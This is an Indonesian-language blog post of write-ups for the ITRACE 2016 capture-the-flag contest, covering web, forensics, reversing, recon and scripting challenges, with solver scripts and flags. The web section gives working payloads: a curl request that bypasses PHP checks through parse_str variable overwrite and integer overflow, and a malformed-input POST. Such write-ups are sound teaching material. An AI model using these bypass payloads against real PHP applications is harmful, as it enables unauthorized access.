---
layout: post
title: "ITRACE 2016 : Writeups"
description: "ITRACE 2016 Level 3 : Writeups"
headline: 
modified: 2016-10-10
date: 2016-10-10
category: CTF
tags: [ITRACE]
imagefeature: /images/itrace.jpg
mathjax: 
chart: 
comments: true
featured: true
---

## Website : Compare Us - 40 Point
---


> Title : Compare Us
Point : 40
Category : #web
Description :
http://task-00000001.itrace.systems/compare-us.php

Di task ini kita harus melakukan bypass terhadap beberapa validasi
untuk mendapatkan flag. Source soal di berikan :

```php
<?php
    error_reporting(0);
    include 'flag.php';
    $check=thepassword();
    parse_str($_SERVER['QUERY_STRING']);
    $A=$_GET['key'];
    if(ctype_xdigit($A)){
        $e=implode('',array_map(function($i,$A){return chr(hexdec($A{$i+$i}.$A{$i+($i+1)}));},list($m,$n,$o)=range(0,2),array($A,$A,$A)));
        if($e<1 && $e>0 && $e!==0){
            if((int)(substr($A,strlen($e)*2)+0) < -1){
                if($check==$_GET['password']){
                    echo flag();
                } else {
                    echo 'Bad.';
                }
            } else {
                echo 'Bad.';
            }
        } else {
            echo 'Bad.';
        }
    } else {
        echo 'Bad.';
    }
    echo "<pre>";
    echo htmlentities(highlight_string(file_get_contents(__FILE__)));
    echo "</pre>";

```
pertama input kita di validasi dengan `ctype_xdigit($A)` yang di terima adalah [0-9a-f]
kemudian ada validasi lagi nah `if($e<1 && $e>0 && $e!==0)`
$e yang di hasilkan harus di antara 0 dan 1. `302e35` adalah hexadecimal dari 0.5 dan
berhasil melewati validasi tersebut.

kemudian `if((int)(substr($A,strlen($e)*2)+0) < -1)` di tahap ini kita
harus membuat hasil dari substr yang di cast ke integer memberikan output < -1
kemungkinan yang bisa kita lakukan adalah dengan melakukan integer overflow,
dengan `29999999999999999999999999999` ternyata sudah berhasil menjadikan minus outputnya.

kemudian `if($check==$_GET['password'])` hampir terasa mustahil untuk menebak apa
isi dari variable `$check` karena kita tidak bisa mengakses file `flag.php`
tapi ternyata ada pemanggilan fungsi `parse_str($_SERVER['QUERY_STRING']);` yang memberikan kita peluang untuk melakukan
overwrite variable yang sudah ada simply `?&check=dor&password=dor` maka input kita berhasil bypass validasi tersebut.

Full payload : `curl "http://task-00000001.itrace.systems/compare-us.php?key=302e3529999999999999999999999999999&check=dor&password=dor" |grep -o ITRACE{[a-z0-9_]*}`

flag : `ITRACE{r1d1n9_i5_34513r_th4n_r34d1n9}`

<br />
<br />


## Website: AJAX XAJA - 25 Point
---


> Title : AJAX XAJA
Point : 25
Category : #web
Description :
command: flag

ketik command flag di website dan cek ajax response via developer tools

```ajax
{command: "flag", flag: "Congratulations. This is your flag: ITRACE{Asynchronous_Javascript_And_XML}",…}
```

<br />
<br />


## Website: Not Heart Bleed - 43 Point
---


> Title : Not Heart Bleed
Point : 43
Category : #web
Description :
http://task-00001110.itrace.systems/request.php

Karena di server hanya menerima UTF-8 kita coba2 kirim character non-UTF
dan server mengembalikan response hexadecimal yang di decode menghasilkan flag

Full payload : `curl -X POST --data "request=���������������������" http://task-00001110.itrace.systems/request.php | cut -d"\"" -f 4 | grep 0[x][0-9a-f]* | sed -e 's/0x//g' | rev | cut -b 6-55 | rev | xxd -r > a && echo -n "ITR" && cat a && rm a`

Flag : `ITRACE{Y4Y_TO_345Y}`

<br />
<br />


## Forensic: Lorem is not Ipsum - 13 Point
---


> Title : Lorem is not Ipsum
Point : 13
Category : #forensic #warmup
Description :
http://task-00000100.itrace.systems/loremisnotipsum.tar.gz

Setelah file soal di extract ada kurang lebih 63 file raw text yang berisi paragraf lorem ipsum, tapi 
tiap file memikili beberapa part yang berbeda. saya gunakan python untuk mengextract flag.

```python

import sys

def printf(c):
	sys.stdout.write(c)
	sys.stdout.flush()

f = open('0.loremipsum')
x = f.read().split(' ')

for i in range(1,63):
	k = str(i)+'.loremipsum'
	h = open(k)
	hh = h.read().split(' ')
	for u in range(len(x)):
		if x[u] == hh[u]:
			pass
		elif hh[u]!='semper':
			printf(hh[u])


```


Flag : `ITRACE{similiriti_similikiti}`


<br />
<br />


## Reversing: Brute Self - 35 Point
---


> Title : Brute Self
Point : 35
Category : #reversing
Description :
http://task-00000011.itrace.systems/password.tar.gz

Di berikan binary ELF-64 Bit Stripped. kita analisa menggunakan IDA 
berdasarkan string yang di output dari program "Bad.". di temukan flag di simpan di dalam array.

Ketika di convert ke ascii hasilnya adalah : 
`'K' 'V' 'T' 'C' 'E' 'G' '}' 'd' '6' 'f' 'a' 'e' '2' 'f' '5' '7' 'a' 'j' '3' 'f' '3' 'p' '8' 'a' '3' 'P' 'a' 'r' '6' 'e' ''`
Seharusnya flag di mulai dengan "ITRACE" 

```
Huruf K posisinya +2 dari I
Huruf V posisinya +2 dari T
...
Huruf G posisinya +2 dari E
```

```python

a = 'K' 'V' 'T' 'C' 'E' 'G' '}' 'd' '6' 'f' 'a' 'e' '2' 'f' '5' '7' 'a' 'j' '3' 'f' '3' 'p' '8' 'a' '3' 'P' 'a' 'r' '6' 'e' ''
flag = ""
for x in a:
	flag += chr(ord(x)-2)
	pass

print flag

```


Semua ascii di kurang 2 dan di temukan flagnya : `ITRACE{b4d_c0d35_h1d1n6_1N_p4ck}`


<br />
<br />


## Website: Square Them - 60 Point
---


> Title : Square Them
Point : 60
Category : #web #ppc
Description :
http://task-00000010.itrace.systems/square.php

di task ini kita harus bikin square yang kalau di jumlah rows dan cols nya itu sama.

```
2	9	4   -> 15
7	5	3   -> 15
6	1	8   -> 15
-   -   -
15  15  15


```

jika sudah dapat susunan yang benar kirim melalui 
`POST numbers=2,9,4,7,5,3,6,1,8` ke websitenya , jika question 1 benar maka akan lanjut ke question 2 
sampai 10 dan di dapatkan flag.

```python

import mechanize
from BeautifulSoup import BeautifulSoup
import urllib,requests
import json

def createSquare(x):
	grid = [[0,0,0],[0,0,0],[0,0,0]]
	x = int(x)
	grid[1][1] = x/3
	grid[2][0] = grid[1][1]+1
	grid[0][2] = grid[1][1]-1

	grid[0][0] = grid[1][1]-3
	grid[1][2] = grid[1][1]-2
	grid[2][1] = grid[1][1]-4

	grid[0][1] = x - (grid[0][0] + grid[0][2])
	grid[1][0] = x - (grid[1][1] + grid[1][2])
	grid[2][2] = x - (grid[2][0] + grid[2][1])

	return grid


br = mechanize.Browser()
url = 'http://task-00000010.itrace.systems/square.php'
content = br.open_novisit(url).read()
soup = BeautifulSoup(content)
soal = soup.find('span').next


count = 0
while count <= 10:
	res = ""
	square = createSquare(soal)
	for x in square:
		for val in x:
			res += str(val) + ','

	res = res[:len(res)-1]



	print "[Recv] : " + str(soal)
	print "[Send] : " + res


	params = {'numbers': res}
	data = urllib.urlencode(params)
	res = br.open(url,data).read()
	print "[Recv]" + res 
	res = json.loads(res)
	soal = res['nextsum']

	count += 1

```

Flag : `ITRACE{m4g1c_squ4r3_is_s0_m4th}`


<br />
<br />


## Forensic: Binary Typ0 - 45 Point
---


> Title : Binary Typ0
Point : 45
Category : #forensic
Description :
http://task-00000101.itrace.systems/raws.pcapng

Di berikan rekaman jaringan format `pcapng`, setelah di analisa di temukan
deretan hexadecimal yang terpisah menjadi beberapa bagian yang di duga adalah gambar
karena ada header magic `FF D8 FF E0` tapi ada karakter yang bukan hexadecimal dan ada yang 1 karakter.

kita gunakan script python untuk membersihkan hexadecimal tersebut.

```python

import sys,re,binascii


def printf(c):
    sys.stdout.write(c)
    sys.stdout.flush()

pattern = re.compile("[0-9a-fA-F]{2}")
res = ""
for i in range(1,11):
    k = str(i)
    h = open(k)
    hh = h.read().split(' ')
    for u in range(len(hh)):
            if pattern.match(hh[u]) and len(hh[u]) == 2:
                res += hh[u]
            elif len(hh[u]) == 1 :
                 fix = "0"+hh[u]
                 if pattern.match(fix):
                    res += fix

text_file = open("hexm", "w")
text_file.write(res)
text_file.close()

with open('hexm') as f, open('test.jpg', 'wb') as fout:
    for line in f:
        fout.write(
            binascii.unhexlify(''.join(line.split()))
        )

```

Flag : `ITRACE{FROM.0-F}`


<br />
<br />


## Recon: Ping Me - 50.1 Point
---


> Title : Ping Me
Point : 50.1
Category : #recon
Description :
Ping Me. Literally.
Hint: are mine


Hasil googling di temukan `http://cafelinux.info/pingme`

Flag : `ITRACE{http_www.cafelinux.info_ping.me}`


<br />
<br />


## Recon: Copy Pasta - 100.2 Point
---


> Title : Copy Pasta
Point : 100.2
Category : #recon
Description :
Hints: 
-actually-heartbeat-opposite
-Pastebin deep internet version
- inurl:pasta
- The hints, is just an ordinary text. Not that technicall 

WARNING: Please use TOR Browser while diving in Deep Web

Di hidden wiki kita cari search engine untuk mencari copy pasta
kemudian kita coba cari di `ahmia` search `pasta` dan di temukan text hosting mirip pastebin
dan jika kita buat paste maka akan muncul kata2 random jadi url nya, dan clue nya adalah `actually-heartbeat-opposite`
seperti kata random yang di generate ketika membuat raw. 

akses ke url nya dengan actually-heartbeat-opposite maka akan mendapatkan flag di address bar.


<br />
<br />


## PPC: Pixel Racist = 70 Point
---


> Title : Pixel Racist
Point : 70
Category : #ppc
Description :
http://task-00001001.itrace.systems/racist.php

mencari pixel yang paling sedikit di gunakan dalam gambar kemudian mengirimkannya sebagai jawaban
ke server, setelah 10 stage di dapatkan flag.

```python
from PIL import Image
import urllib
import urllib2
from collections import defaultdict
from mechanize import Browser

br = Browser()
url = "http://task-00001001.itrace.systems/image.php"
url2 = "http://task-00001001.itrace.systems/racist.php"
br.open(url2)

while 1:
	im = Image.open(br.open_novisit(url))
	by_color = defaultdict(int)
	for pixel in im.getdata():
	    by_color[pixel] += 1
	    
	res = ""
	curr = 9999999999
	for x,y in by_color.items():
	    if curr>y:
	        curr = y
	        res = x
	res = "%02x%02x%02x" % res
	pasam = {'color': res}
	data = urllib.urlencode(pasam)
	daa = br.open(url2,data)
	c = daa.read()
	if "flag:" in c:
		print c
		break

```

Flag : `ITRACE{y0u_6uy5_4r3_4wes0m3}`


<br />
<br />


## PPC: Scazzy - 88 Point
---


> Title : Scazzy
Point : 88
Category : #ppc
Description :
Scazzy, bot berjenis kelamin perempuan. Suka menggoda. Tapi kalo dirayu jual mahal. https://web.telegram.org/#/im?p=@itrace

untuk menjawab pertanyaan bot telegram ini kita perlu melakukan decode terhadap pesannya dan kemudian calculate
dan kirim jawabannya, tapi di saya solve dengan setengah manual tapi dengan bantuan python.

```python
# -*- coding: utf-8 -*-

import re


def decc(data):
	pattern = re.compile("0[xX][0-9a-fA-F]+")
	pattern2 = re.compile("[0-1]{8}")

	if pattern.match(data) :
		#decode hex
		data = int(data,16)
		return data
	elif pattern2.match(data):
		#decode binary
		data = int('0b'+data,2)
		return data	


pattern = re.compile("0[xX][0-9a-fA-F]+")
pattern2 = re.compile("[0-1]{8}")

soal = raw_input()
soal = soal.split(" ")

num = list()
opp = list()
x1=0
x2=0
mas = ""
for k in soal:
	if pattern.match(k):
		num.append(decc(k))
		mas += str(decc(k))
		x1+=1
	elif pattern2.match(k):
		num.append(decc(k))
		mas += str(decc(k))
		x1+=1

	elif k == "add" or k == "x" or k == "+" or k == "-" or k == "/" or k == "\xc3\xb7":
		if k == "add":
			k = "+"
		elif k == "x":
			k = "*"
		elif k == "\xc3\xb7":
			k = "/"

		opp.append(k)
		mas += k
		x2+=1

print mas



res = eval(str(mas))
print "/answer" , res


```

setelah 20 stage menjawab pertanyaan di dapatkan flag
Flag : `Congratulations. This is your flag: ITRACE{b0t_tele6r4m_i5_m0d3rn_typ3_0f_ircs_b0t}`


<br />
<br />


## Misc : Print The Flag - 21 Point
---


> Title : Print The Flag
Point : 21
Category : #misc
Description :
Download PrintTheFlag.class and reupload to http://45.64.99.71:5555/upload.php


di berikan file PrintTheFlag.class yang header nya corrupt. kita fix headernya dengan `hexedit`
ke `CA FE BA BE` dan upload ke website `http://45.64.99.71:5555/upload.php` untuk di jalankan 
dan di dapatkan flagnya

Flag : `ITRACE{s0m3t1m35_j4v4_is_s0_t3xty`


<br />
<br />
<br />
<br />


## Trivia: Ternate Maluku Utara Indonesia Timur - 10 Point
---


> Title : Ternate Maluku Utara Indonesia Timur
Point : 10
Category : #trivia
Description :
https://goo.gl/forms/c0bKCOYi3CUJXtMh2

Isi survey dan di dapat flag.

